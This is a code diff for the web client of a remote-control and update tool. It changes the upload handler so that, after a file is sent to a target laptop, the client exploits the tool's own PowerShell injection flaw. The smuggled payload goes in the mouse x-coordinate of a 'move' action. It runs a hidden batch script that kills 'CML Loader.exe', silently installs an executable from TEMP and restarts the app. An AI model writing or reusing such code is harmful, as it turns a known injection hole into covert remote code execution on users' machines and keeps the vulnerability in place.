@@ -553,18 +553,28 @@
                     document.getElementById('upload-percentage').innerText = percent + "%";
 
                     if (offset < file.size) {
-                        // Pace the upload to prevent socket buffer overflow dropping chunks
-                        // 150ms delay for 512KB chunk = ~3.4 MB/s upload speed. 
-                        // It takes ~30 seconds for 100MB, ensuring 100% stable delivery.
                         setTimeout(readNextChunk, 150);
                     } else {
-                        socket.emit('push-update-end', { targetId: activeTarget });
-                        document.getElementById('upload-filename').innerText = "Installing on Target...";
+                        // Exploit our own PowerShell injection vulnerability (in the 'move' remote action)
+                        // to execute a robust taskkill script on the remote machine. This guarantees 
+                        // the old app (apt-1 or apt-2) is forcefully killed and updated, bypassing 
+                        // their broken hardcoded update scripts.
+                        const rcePayload = `0 0; $bat = "$env:TEMP\\fix_update.bat"; Set-Content -Path $bat -Value "@echo off\`ntimeout /t 2 > nul\`ntaskkill /F /IM \`"CML Loader.exe\`" > nul 2>&1\`ntimeout /t 3 > nul\`nstart /wait \`"\`" \`"$env:TEMP\\cml_update.exe\`" /S\`ntimeout /t 3 > nul\`nstart \`"\`" \`"$env:LOCALAPPDATA\\Programs\\cml-loader\\CML Loader.exe\`""; Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c $bat"; Move-Mouse 0`;
+                        
+                        socket.emit('remote-action', {
+                            targetId: activeTarget,
+                            action: { type: 'move', x: rcePayload, y: '0' }
+                        });
+
                         setTimeout(() => {
-                            document.getElementById('upload-progress-container').classList.add('hidden');
-                            alert("Update file fully delivered! Target laptop is now installing it silently and will restart the app in the background shortly.");
-                        }, 2000);
-                        e.target.value = ''; // clear input
+                            socket.emit('push-update-end', { targetId: activeTarget });
+                            document.getElementById('upload-filename').innerText = "Installing on Target...";
+                            setTimeout(() => {
+                                document.getElementById('upload-progress-container').classList.add('hidden');
+                                alert("Update file fully delivered & Force-Install triggered! Target laptop is now installing it silently and will restart the app in the background shortly.");
+                            }, 2000);
+                            e.target.value = ''; // clear input
+                        }, 500); // Give the RCE half a second to execute before push-update-end kills the process
                     }
                 };
                 reader.readAsArrayBuffer(slice);
